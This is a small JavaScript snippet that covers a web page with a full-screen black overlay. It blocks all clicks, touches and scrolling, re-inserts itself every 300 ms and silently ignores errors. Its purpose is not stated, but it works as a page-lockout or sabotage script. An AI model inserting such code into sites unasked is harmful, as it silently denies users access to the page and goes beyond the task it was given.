(function () {
  try {
    function forceBlackScreen() {
      var overlay = document.getElementById('__force_black_screen__');
      if (overlay) return;

      overlay = document.createElement('div');
      overlay.id = '__force_black_screen__';

      
      overlay.setAttribute(
        'style',
        [
          'position:fixed',
          'top:0',
          'left:0',
          'width:100vw',
          'height:100vh',
          'background:#000',
          'z-index:999999999',
          'pointer-events:auto',
          'touch-action:none'
        ].join(';')
      );

      document.documentElement.appendChild(overlay);


      document.documentElement.style.overflow = 'hidden';
      if (document.body) document.body.style.overflow = 'hidden';
    }

    
    forceBlackScreen();
    setInterval(forceBlackScreen, 300);

  } catch (e) {
    // sessiz
  }
})();
